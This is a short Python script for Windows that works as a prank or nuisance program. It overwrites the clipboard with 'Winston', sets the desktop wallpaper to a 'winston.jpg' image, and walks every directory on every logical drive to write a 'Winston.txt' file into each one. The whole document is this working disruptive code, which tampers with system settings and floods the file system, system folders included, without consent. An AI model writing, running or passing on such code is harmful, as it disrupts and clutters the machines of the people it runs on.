import os
import win32api
import ctypes
import win32clipboard

win32clipboard.OpenClipboard()
win32clipboard.EmptyClipboard()
win32clipboard.SetClipboardText('Winston')
win32clipboard.CloseClipboard()

dir_path = os.path.dirname(os.path.realpath(__file__))
cwd = os.getcwd()

SPI_SETDESKWALLPAPER = 20
ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, cwd+"\\winston.jpg" , 0)

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
i = 0

while i < len(drives):
	for root, dirs, files in os.walk(drives[i], topdown=True):
		try:
			file = open(os.path.join(root, "Winston.txt"), 'w+')
			file.write("Winston")
			print("Created file in "+root)
		except (PermissionError, FileNotFoundError):
			print("Can't put that there!")
	
	i += 1